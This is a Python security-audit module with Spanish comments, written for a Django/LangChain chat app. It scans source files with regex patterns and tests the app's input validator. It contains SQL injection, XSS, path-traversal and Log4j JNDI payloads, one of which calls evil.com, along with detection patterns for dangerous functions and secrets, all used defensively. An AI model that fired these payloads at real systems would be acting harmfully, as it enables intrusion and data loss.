"""
Framework de Revisión de Seguridad y Pruebas de Vulnerabilidades
Proporciona herramientas automáticas para auditorías de seguridad y detección de vulnerabilidades
"""

import logging
import time
import subprocess
import re
from typing import Dict, List, Any, Optional, Callable, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime, timedelta
import json
import asyncio
import importlib
import inspect
from pathlib import Path

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Tipos de vulnerabilidades"""
    INJECTION = "injection"                     # SQL, NoSQL, Command injection
    XSS = "cross_site_scripting"               # Cross-site scripting
    PRIVILEGE_ESCALATION = "privilege_escalation"  # Escalación de privilegios
    DATA_EXPOSURE = "data_exposure"            # Exposición de datos sensibles
    AUTHENTICATION = "authentication"          # Problemas de autenticación
    AUTHORIZATION = "authorization"            # Problemas de autorización
    INPUT_VALIDATION = "input_validation"      # Validación de entrada insuficiente
    CRYPTOGRAPHY = "cryptography"              # Problemas criptográficos
    SESSION_MANAGEMENT = "session_management"  # Gestión de sesiones
    CONFIGURATION = "configuration"           # Configuración insegura


class SeverityLevel(Enum):
    """Niveles de severidad"""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class Vulnerability:
    """Vulnerabilidad detectada"""
    vuln_type: VulnerabilityType
    severity: SeverityLevel
    title: str
    description: str
    location: str                              # Archivo/función donde se encontró
    evidence: Dict[str, Any] = field(default_factory=dict)
    recommendations: List[str] = field(default_factory=list)
    cve_references: List[str] = field(default_factory=list)
    detected_at: datetime = field(default_factory=datetime.now)
    false_positive: bool = False


@dataclass
class SecurityTest:
    """Prueba de seguridad"""
    name: str
    description: str
    test_function: Callable
    vulnerability_types: List[VulnerabilityType]
    severity_level: SeverityLevel
    enabled: bool = True


@dataclass
class SecurityAuditResult:
    """Resultado de auditoría de seguridad"""
    audit_id: str
    start_time: datetime
    end_time: Optional[datetime] = None
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    tests_run: int = 0
    tests_passed: int = 0
    tests_failed: int = 0
    overall_score: float = 0.0  # 0-100, donde 100 es completamente seguro
    recommendations: List[str] = field(default_factory=list)


class SecurityTester:
    """Framework de pruebas de seguridad"""

    def __init__(self):
        self.security_tests = {}
        self.vulnerability_patterns = {}
        self.audit_history = []
        self._setup_default_tests()
        self._setup_vulnerability_patterns()

    def _setup_default_tests(self):
        """Configura pruebas de seguridad por defecto"""

        # Test de inyección SQL
        self.security_tests["sql_injection"] = SecurityTest(
            name="sql_injection",
            description="Detecta vulnerabilidades de inyección SQL",
            test_function=self._test_sql_injection,
            vulnerability_types=[VulnerabilityType.INJECTION],
            severity_level=SeverityLevel.HIGH
        )

        # Test de XSS
        self.security_tests["xss_detection"] = SecurityTest(
            name="xss_detection",
            description="Detecta vulnerabilidades XSS",
            test_function=self._test_xss_vulnerabilities,
            vulnerability_types=[VulnerabilityType.XSS],
            severity_level=SeverityLevel.HIGH
        )

        # Test de validación de entrada
        self.security_tests["input_validation"] = SecurityTest(
            name="input_validation",
            description="Verifica validación de entradas",
            test_function=self._test_input_validation,
            vulnerability_types=[VulnerabilityType.INPUT_VALIDATION],
            severity_level=SeverityLevel.MEDIUM
        )

        # Test de gestión de privilegios
        self.security_tests["privilege_management"] = SecurityTest(
            name="privilege_management",
            description="Verifica gestión de privilegios",
            test_function=self._test_privilege_management,
            vulnerability_types=[VulnerabilityType.PRIVILEGE_ESCALATION],
            severity_level=SeverityLevel.HIGH
        )

        # Test de exposición de datos
        self.security_tests["data_exposure"] = SecurityTest(
            name="data_exposure",
            description="Detecta exposición de datos sensibles",
            test_function=self._test_data_exposure,
            vulnerability_types=[VulnerabilityType.DATA_EXPOSURE],
            severity_level=SeverityLevel.CRITICAL
        )

        # Test de configuración de seguridad
        self.security_tests["security_configuration"] = SecurityTest(
            name="security_configuration",
            description="Verifica configuración de seguridad",
            test_function=self._test_security_configuration,
            vulnerability_types=[VulnerabilityType.CONFIGURATION],
            severity_level=SeverityLevel.MEDIUM
        )

        # Test de gestión de sesiones
        self.security_tests["session_management"] = SecurityTest(
            name="session_management",
            description="Verifica gestión de sesiones",
            test_function=self._test_session_management,
            vulnerability_types=[VulnerabilityType.SESSION_MANAGEMENT],
            severity_level=SeverityLevel.MEDIUM
        )

    def _setup_vulnerability_patterns(self):
        """Configura patrones de vulnerabilidades conocidas"""

        # Patrones de inyección SQL
        self.vulnerability_patterns[VulnerabilityType.INJECTION] = [
            r"(?i)select\s+.*\s+from\s+.*\s+where\s+.*\s*=\s*['\"].*['\"]",
            r"(?i)union\s+select",
            r"(?i)drop\s+table",
            r"(?i)delete\s+from",
            r"(?i)insert\s+into",
            r"(?i)update\s+.*\s+set",
            r"exec\s*\(",
            r"eval\s*\(",
            r"system\s*\(",
        ]

        # Patrones de XSS
        self.vulnerability_patterns[VulnerabilityType.XSS] = [
            r"<script[^>]*>.*?</script>",
            r"javascript:",
            r"vbscript:",
            r"onload\s*=",
            r"onerror\s*=",
            r"onclick\s*=",
            r"<iframe[^>]*>",
            r"document\.cookie",
            r"document\.write",
        ]

        # Patrones de exposición de datos
        self.vulnerability_patterns[VulnerabilityType.DATA_EXPOSURE] = [
            r"password\s*=\s*['\"][^'\"]*['\"]",
            r"secret\s*=\s*['\"][^'\"]*['\"]",
            r"api_key\s*=\s*['\"][^'\"]*['\"]",
            r"private_key",
            r"rut\s*=\s*['\"]?\d{1,2}\.\d{3}\.\d{3}-[\dkK]['\"]?",
            r"email\s*=\s*['\"][^'\"]*@[^'\"]*['\"]",
        ]

        # Patrones de configuración insegura
        self.vulnerability_patterns[VulnerabilityType.CONFIGURATION] = [
            r"DEBUG\s*=\s*True",
            r"SECRET_KEY\s*=\s*['\"][^'\"]{1,20}['\"]",  # Claves muy cortas
            r"ALLOWED_HOSTS\s*=\s*\[\s*\*\s*\]",
            r"ssl_verify\s*=\s*False",
            r"verify\s*=\s*False",
        ]

    async def run_security_audit(self, target_modules: Optional[List[str]] = None) -> SecurityAuditResult:
        """Ejecuta auditoría completa de seguridad"""

        audit_id = f"audit_{int(datetime.now().timestamp())}"
        audit_result = SecurityAuditResult(
            audit_id=audit_id,
            start_time=datetime.now()
        )

        logger.info(f"Iniciando auditoría de seguridad: {audit_id}")

        # Determinar módulos a auditar
        if target_modules is None:
            target_modules = [
                "apps.chat.services.langchain.security",
                "apps.chat.services.langchain.agents",
                "apps.chat.services.langchain.monitoring"
            ]

        # Ejecutar todas las pruebas habilitadas
        for test_name, test in self.security_tests.items():
            if not test.enabled:
                continue

            try:
                logger.info(f"Ejecutando prueba: {test_name}")
                vulnerabilities = await test.test_function(target_modules)
                audit_result.vulnerabilities.extend(vulnerabilities)
                audit_result.tests_run += 1

                if not vulnerabilities:
                    audit_result.tests_passed += 1
                else:
                    audit_result.tests_failed += 1

            except Exception as e:
                logger.error(f"Error ejecutando prueba {test_name}: {e}")
                audit_result.tests_failed += 1

        # Análisis estático de código
        static_vulnerabilities = await self._run_static_analysis(target_modules)
        audit_result.vulnerabilities.extend(static_vulnerabilities)

        # Calcular puntuación general
        audit_result.overall_score = self._calculate_security_score(audit_result.vulnerabilities)

        # Generar recomendaciones
        audit_result.recommendations = self._generate_recommendations(audit_result.vulnerabilities)

        audit_result.end_time = datetime.now()
        self.audit_history.append(audit_result)

        logger.info(f"Auditoría completada: {audit_id} - Score: {audit_result.overall_score:.1f}/100")
        return audit_result

    async def _test_sql_injection(self, target_modules: List[str]) -> List[Vulnerability]:
        """Prueba vulnerabilidades de inyección SQL"""

        vulnerabilities = []

        # Cargar módulos y analizar código
        for module_name in target_modules:
            try:
                module = importlib.import_module(module_name)
                source_files = self._get_module_source_files(module)

                for file_path in source_files:
                    file_vulnerabilities = self._scan_file_for_patterns(
                        file_path, VulnerabilityType.INJECTION
                    )
                    vulnerabilities.extend(file_vulnerabilities)

            except ImportError:
                logger.warning(f"No se pudo importar módulo: {module_name}")

        # Pruebas dinámicas con payloads SQL
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1#"
        ]

        # Simular pruebas con input validator
        try:
            from .input_validator import get_input_validator
            validator = get_input_validator()

            for payload in sql_payloads:
                validation_result = validator.validate_input(payload)
                if validation_result.result.value != "blocked":
                    vulnerabilities.append(Vulnerability(
                        vuln_type=VulnerabilityType.INJECTION,
                        severity=SeverityLevel.HIGH,
                        title="SQL Injection payload no bloqueado",
                        description=f"El payload '{payload}' no fue bloqueado por el validador",
                        location="input_validator",
                        evidence={"payload": payload, "result": validation_result.result.value},
                        recommendations=[
                            "Mejorar patrones de detección SQL",
                            "Implementar validación más estricta"
                        ]
                    ))
        except ImportError:
            pass

        return vulnerabilities

    async def _test_xss_vulnerabilities(self, target_modules: List[str]) -> List[Vulnerability]:
        """Prueba vulnerabilities XSS"""

        vulnerabilities = []

        # Payloads XSS comunes
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]

        try:
            from .input_validator import get_input_validator
            validator = get_input_validator()

            for payload in xss_payloads:
                validation_result = validator.validate_input(payload)
                if validation_result.result.value not in ["blocked", "sanitized"]:
                    vulnerabilities.append(Vulnerability(
                        vuln_type=VulnerabilityType.XSS,
                        severity=SeverityLevel.HIGH,
                        title="XSS payload no mitigado",
                        description=f"El payload XSS '{payload}' no fue adecuadamente mitigado",
                        location="input_validator",
                        evidence={"payload": payload, "result": validation_result.result.value},
                        recommendations=[
                            "Implementar sanitización HTML",
                            "Escapar caracteres especiales",
                            "Validar patrones JavaScript"
                        ]
                    ))
        except ImportError:
            pass

        return vulnerabilities

    async def _test_input_validation(self, target_modules: List[str]) -> List[Vulnerability]:
        """Prueba robustez de validación de entrada"""

        vulnerabilities = []

        # Casos de prueba extremos
        test_cases = [
            {"input": "A" * 10000, "description": "String muy largo"},
            {"input": "\x00\x01\x02", "description": "Caracteres de control"},
            {"input": "../../../../etc/passwd", "description": "Path traversal"},
            {"input": "${jndi:ldap://evil.com/a}", "description": "Log4j injection"},
            {"input": "{{7*7}}", "description": "Template injection"}
        ]

        try:
            from .input_validator import get_input_validator
            validator = get_input_validator()

            for test_case in test_cases:
                validation_result = validator.validate_input(test_case["input"])

                # Verificar que entradas peligrosas sean bloqueadas
                if test_case["description"] in ["Path traversal", "Log4j injection", "Template injection"]:
                    if validation_result.result.value != "blocked":
                        vulnerabilities.append(Vulnerability(
                            vuln_type=VulnerabilityType.INPUT_VALIDATION,
                            severity=SeverityLevel.MEDIUM,
                            title=f"Validación insuficiente: {test_case['description']}",
                            description=f"Entrada peligrosa no bloqueada: {test_case['input'][:50]}",
                            location="input_validator",
                            evidence=test_case,
                            recommendations=["Añadir patrones de detección específicos"]
                        ))

        except ImportError:
            vulnerabilities.append(Vulnerability(
                vuln_type=VulnerabilityType.INPUT_VALIDATION,
                severity=SeverityLevel.HIGH,
                title="Input validator no disponible",
                description="Sistema de validación de entradas no implementado",
                location="sistema",
                recommendations=["Implementar validación de entradas robusta"]
            ))

        return vulnerabilities

    async def _test_privilege_management(self, target_modules: List[str]) -> List[Vulnerability]:
        """Prueba gestión de privilegios"""

        vulnerabilities = []

        try:
            from .privilege_manager import get_privilege_manager
            privilege_manager = get_privilege_manager()

            # Verificar roles por defecto
            if not hasattr(privilege_manager, 'roles') or not privilege_manager.roles:
                vulnerabilities.append(Vulnerability(
                    vuln_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                    severity=SeverityLevel.HIGH,
                    title="Roles de seguridad no configurados",
                    description="Sistema de roles no implementado adecuadamente",
                    location="privilege_manager",
                    recommendations=["Configurar roles con principio de menor privilegio"]
                ))

            # Verificar sesiones activas (simulado)
            if hasattr(privilege_manager, 'active_sessions'):
                for session_id, session in privilege_manager.active_sessions.items():
                    # Verificar sesiones sin expiración
                    if not session.get("expires_at"):
                        vulnerabilities.append(Vulnerability(
                            vuln_type=VulnerabilityType.SESSION_MANAGEMENT,
                            severity=SeverityLevel.MEDIUM,
                            title="Sesión sin expiración",
                            description=f"Sesión {session_id} no tiene fecha de expiración",
                            location="privilege_manager",
                            recommendations=["Implementar expiración automática de sesiones"]
                        ))

        except ImportError:
            vulnerabilities.append(Vulnerability(
                vuln_type=VulnerabilityType.PRIVILEGE_ESCALATION,
                severity=SeverityLevel.CRITICAL,
                title="Gestor de privilegios no disponible",
                description="Sistema de gestión de privilegios no implementado",
                location="sistema",
                recommendations=["Implementar sistema de gestión de privilegios"]
            ))

        return vulnerabilities

    async def _test_data_exposure(self, target_modules: List[str]) -> List[Vulnerability]:
        """Prueba exposición de datos sensibles"""

        vulnerabilities = []

        # Analizar archivos en busca de datos sensibles hardcodeados
        for module_name in target_modules:
            try:
                module = importlib.import_module(module_name)
                source_files = self._get_module_source_files(module)

                for file_path in source_files:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()

                    # Buscar patrones de datos sensibles
                    patterns = self.vulnerability_patterns.get(VulnerabilityType.DATA_EXPOSURE, [])
                    for pattern in patterns:
                        matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
                        for match in matches:
                            line_number = content[:match.start()].count('\n') + 1
                            vulnerabilities.append(Vulnerability(
                                vuln_type=VulnerabilityType.DATA_EXPOSURE,
                                severity=SeverityLevel.HIGH,
                                title="Posible exposición de datos sensibles",
                                description=f"Patrón sensible encontrado en línea {line_number}",
                                location=f"{file_path}:{line_number}",
                                evidence={"pattern": pattern, "match": match.group()[:50]},
                                recommendations=[
                                    "Usar variables de entorno para datos sensibles",
                                    "Implementar cifrado para datos en reposo"
                                ]
                            ))

            except (ImportError, FileNotFoundError, PermissionError) as e:
                logger.warning(f"No se pudo analizar módulo {module_name}: {e}")

        return vulnerabilities

    async def _test_security_configuration(self, target_modules: List[str]) -> List[Vulnerability]:
        """Prueba configuración de seguridad"""

        vulnerabilities = []

        # Verificar configuración de Django si está disponible
        try:
            from django.conf import settings

            # DEBUG en producción
            if getattr(settings, 'DEBUG', False):
                vulnerabilities.append(Vulnerability(
                    vuln_type=VulnerabilityType.CONFIGURATION,
                    severity=SeverityLevel.HIGH,
                    title="DEBUG habilitado",
                    description="DEBUG=True puede exponer información sensible",
                    location="settings",
                    recommendations=["Establecer DEBUG=False en producción"]
                ))

            # SECRET_KEY débil
            secret_key = getattr(settings, 'SECRET_KEY', '')
            if len(secret_key) < 50:
                vulnerabilities.append(Vulnerability(
                    vuln_type=VulnerabilityType.CONFIGURATION,
                    severity=SeverityLevel.HIGH,
                    title="SECRET_KEY débil",
                    description="La SECRET_KEY es muy corta o predecible",
                    location="settings",
                    recommendations=["Generar SECRET_KEY criptográficamente fuerte"]
                ))

            # ALLOWED_HOSTS permisivo
            allowed_hosts = getattr(settings, 'ALLOWED_HOSTS', [])
            if '*' in allowed_hosts:
                vulnerabilities.append(Vulnerability(
                    vuln_type=VulnerabilityType.CONFIGURATION,
                    severity=SeverityLevel.MEDIUM,
                    title="ALLOWED_HOSTS permisivo",
                    description="ALLOWED_HOSTS incluye '*' que permite cualquier host",
                    location="settings",
                    recommendations=["Especificar hosts permitidos explícitamente"]
                ))

        except ImportError:
            pass

        return vulnerabilities

    async def _test_session_management(self, target_modules: List[str]) -> List[Vulnerability]:
        """Prueba gestión de sesiones"""

        vulnerabilities = []

        try:
            from .privilege_manager import get_privilege_manager
            privilege_manager = get_privilege_manager()

            # Verificar limpieza de sesiones expiradas
            if hasattr(privilege_manager, 'active_sessions'):
                current_time = datetime.now()
                expired_count = 0

                for session in privilege_manager.active_sessions.values():
                    expires_at = session.get("expires_at")
                    if expires_at and isinstance(expires_at, datetime) and expires_at < current_time:
                        expired_count += 1

                if expired_count > 0:
                    vulnerabilities.append(Vulnerability(
                        vuln_type=VulnerabilityType.SESSION_MANAGEMENT,
                        severity=SeverityLevel.MEDIUM,
                        title="Sesiones expiradas no limpiadas",
                        description=f"{expired_count} sesiones expiradas siguen activas",
                        location="privilege_manager",
                        evidence={"expired_count": expired_count},
                        recommendations=["Implementar limpieza automática de sesiones expiradas"]
                    ))

        except ImportError:
            pass

        return vulnerabilities

    async def _run_static_analysis(self, target_modules: List[str]) -> List[Vulnerability]:
        """Ejecuta análisis estático de código"""

        vulnerabilities = []

        for module_name in target_modules:
            try:
                module = importlib.import_module(module_name)
                source_files = self._get_module_source_files(module)

                for file_path in source_files:
                    file_vulnerabilities = self._analyze_source_file(file_path)
                    vulnerabilities.extend(file_vulnerabilities)

            except ImportError:
                continue

        return vulnerabilities

    def _get_module_source_files(self, module) -> List[str]:
        """Obtiene archivos fuente de un módulo"""

        source_files = []

        if hasattr(module, '__file__') and module.__file__:
            module_path = Path(module.__file__).parent

            # Buscar archivos .py en el módulo
            for py_file in module_path.rglob('*.py'):
                if py_file.name != '__init__.py':
                    source_files.append(str(py_file))

        return source_files

    def _analyze_source_file(self, file_path: str) -> List[Vulnerability]:
        """Analiza un archivo fuente en busca de vulnerabilidades"""

        vulnerabilities = []

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Buscar patrones peligrosos
            dangerous_functions = [
                'eval', 'exec', 'compile', '__import__',
                'subprocess.call', 'os.system', 'os.popen'
            ]

            for func in dangerous_functions:
                if func in content:
                    line_number = self._find_line_number(content, func)
                    vulnerabilities.append(Vulnerability(
                        vuln_type=VulnerabilityType.INJECTION,
                        severity=SeverityLevel.HIGH,
                        title=f"Función peligrosa: {func}",
                        description=f"Uso de función potencialmente peligrosa en línea {line_number}",
                        location=f"{file_path}:{line_number}",
                        evidence={"function": func},
                        recommendations=["Evitar funciones dinámicas peligrosas", "Usar alternativas seguras"]
                    ))

        except (FileNotFoundError, PermissionError, UnicodeDecodeError) as e:
            logger.warning(f"No se pudo analizar archivo {file_path}: {e}")

        return vulnerabilities

    def _find_line_number(self, content: str, pattern: str) -> int:
        """Encuentra número de línea donde aparece un patrón"""

        lines = content.split('\n')
        for i, line in enumerate(lines):
            if pattern in line:
                return i + 1
        return 1

    def _scan_file_for_patterns(self, file_path: str, vuln_type: VulnerabilityType) -> List[Vulnerability]:
        """Escanea archivo en busca de patrones de vulnerabilidad específicos"""

        vulnerabilities = []
        patterns = self.vulnerability_patterns.get(vuln_type, [])

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            for pattern in patterns:
                matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
                for match in matches:
                    line_number = content[:match.start()].count('\n') + 1
                    vulnerabilities.append(Vulnerability(
                        vuln_type=vuln_type,
                        severity=SeverityLevel.MEDIUM,
                        title=f"Patrón sospechoso detectado",
                        description=f"Patrón de vulnerabilidad encontrado en línea {line_number}",
                        location=f"{file_path}:{line_number}",
                        evidence={"pattern": pattern, "match": match.group()[:100]},
                        recommendations=["Revisar código y aplicar mitigaciones apropiadas"]
                    ))

        except (FileNotFoundError, PermissionError, UnicodeDecodeError):
            pass

        return vulnerabilities

    def _calculate_security_score(self, vulnerabilities: List[Vulnerability]) -> float:
        """Calcula puntuación de seguridad basada en vulnerabilidades"""

        if not vulnerabilities:
            return 100.0

        # Pesos por severidad
        severity_weights = {
            SeverityLevel.INFO: 0,
            SeverityLevel.LOW: 5,
            SeverityLevel.MEDIUM: 15,
            SeverityLevel.HIGH: 30,
            SeverityLevel.CRITICAL: 50
        }

        total_deduction = 0
        for vuln in vulnerabilities:
            if not vuln.false_positive:
                total_deduction += severity_weights.get(vuln.severity, 10)

        # Score máximo es 100, mínimo es 0
        score = max(0.0, 100.0 - total_deduction)
        return score

    def _generate_recommendations(self, vulnerabilities: List[Vulnerability]) -> List[str]:
        """Genera recomendaciones basadas en vulnerabilidades encontradas"""

        recommendations = set()

        for vuln in vulnerabilities:
            if not vuln.false_positive:
                recommendations.update(vuln.recommendations)

        # Recomendaciones generales
        if vulnerabilities:
            recommendations.add("Realizar auditorías de seguridad periódicas")
            recommendations.add("Implementar monitoreo de seguridad en tiempo real")
            recommendations.add("Capacitar equipo en mejores prácticas de seguridad")

        return list(recommendations)

    def mark_false_positive(self, audit_id: str, vulnerability_index: int):
        """Marca una vulnerabilidad como falso positivo"""

        for audit in self.audit_history:
            if audit.audit_id == audit_id:
                if 0 <= vulnerability_index < len(audit.vulnerabilities):
                    audit.vulnerabilities[vulnerability_index].false_positive = True
                    logger.info(f"Vulnerabilidad marcada como falso positivo: {audit_id}[{vulnerability_index}]")
                break

    def generate_security_report(self, audit_result: SecurityAuditResult) -> Dict[str, Any]:
        """Genera reporte detallado de seguridad"""

        # Estadísticas por tipo de vulnerabilidad
        vuln_by_type = {}
        for vuln_type in VulnerabilityType:
            vuln_count = len([v for v in audit_result.vulnerabilities
                            if v.vuln_type == vuln_type and not v.false_positive])
            if vuln_count > 0:
                vuln_by_type[vuln_type.value] = vuln_count

        # Estadísticas por severidad
        vuln_by_severity = {}
        for severity in SeverityLevel:
            vuln_count = len([v for v in audit_result.vulnerabilities
                            if v.severity == severity and not v.false_positive])
            if vuln_count > 0:
                vuln_by_severity[severity.value] = vuln_count

        # Top vulnerabilidades críticas
        critical_vulnerabilities = [
            {
                "title": v.title,
                "description": v.description,
                "location": v.location,
                "severity": v.severity.value
            }
            for v in audit_result.vulnerabilities
            if v.severity == SeverityLevel.CRITICAL and not v.false_positive
        ]

        return {
            "audit_summary": {
                "audit_id": audit_result.audit_id,
                "execution_time": (audit_result.end_time - audit_result.start_time).total_seconds() if audit_result.end_time else 0,
                "overall_score": audit_result.overall_score,
                "tests_run": audit_result.tests_run,
                "tests_passed": audit_result.tests_passed,
                "tests_failed": audit_result.tests_failed
            },
            "vulnerability_summary": {
                "total_vulnerabilities": len([v for v in audit_result.vulnerabilities if not v.false_positive]),
                "by_type": vuln_by_type,
                "by_severity": vuln_by_severity,
                "false_positives": len([v for v in audit_result.vulnerabilities if v.false_positive])
            },
            "critical_vulnerabilities": critical_vulnerabilities,
            "recommendations": audit_result.recommendations,
            "next_audit_recommended": (datetime.now() + timedelta(days=30)).isoformat()
        }

    def get_security_trends(self) -> Dict[str, Any]:
        """Analiza tendencias de seguridad basado en auditorías históricas"""

        if len(self.audit_history) < 2:
            return {"message": "Insuficientes datos para análisis de tendencias"}

        # Comparar últimas dos auditorías
        latest = self.audit_history[-1]
        previous = self.audit_history[-2]

        score_trend = latest.overall_score - previous.overall_score
        vuln_trend = len(latest.vulnerabilities) - len(previous.vulnerabilities)

        return {
            "score_trend": {
                "current": latest.overall_score,
                "previous": previous.overall_score,
                "change": score_trend,
                "improving": score_trend > 0
            },
            "vulnerability_trend": {
                "current": len(latest.vulnerabilities),
                "previous": len(previous.vulnerabilities),
                "change": vuln_trend,
                "improving": vuln_trend < 0
            },
            "audit_frequency": len(self.audit_history),
            "last_audit": latest.start_time.isoformat()
        }


# Singleton global
_security_tester = None


def get_security_tester() -> SecurityTester:
    """Obtiene la instancia global del tester de seguridad"""
    global _security_tester
    if _security_tester is None:
        _security_tester = SecurityTester()
    return _security_tester


async def run_quick_security_scan() -> Dict[str, Any]:
    """Ejecuta escaneo rápido de seguridad"""

    tester = get_security_tester()
    audit_result = await tester.run_security_audit([
        "apps.chat.services.langchain.security"
    ])

    return tester.generate_security_report(audit_result)